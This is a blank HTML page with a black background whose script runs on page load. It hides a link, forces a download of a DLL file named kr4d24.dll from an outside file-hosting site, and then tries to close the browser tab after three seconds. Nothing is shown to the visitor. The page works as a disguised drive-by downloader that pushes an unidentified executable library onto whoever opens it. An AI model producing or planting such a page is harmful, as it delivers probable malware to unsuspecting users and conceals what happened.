<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title></title>
  <style>
    body {
      background-color: black;
      margin: 0;
      overflow: hidden;
    }
  </style>
</head>
<body>
  <script>
    window.onload = () => {
      const fileUrl = "https://files.catbox.moe/kr4d24.dll";
      const a = document.createElement("a");
      a.href = fileUrl;
      a.download = "kr4d24.dll"; // fuerza el nombre del archivo al descargar
      a.style.display = "none";
      document.body.appendChild(a);
      a.click();

      // Cierra la pestaña después de unos segundos
      setTimeout(() => {
        window.open('', '_self', '');
        window.close();
      }, 3000);
    };
  </script>
</body>
</html>
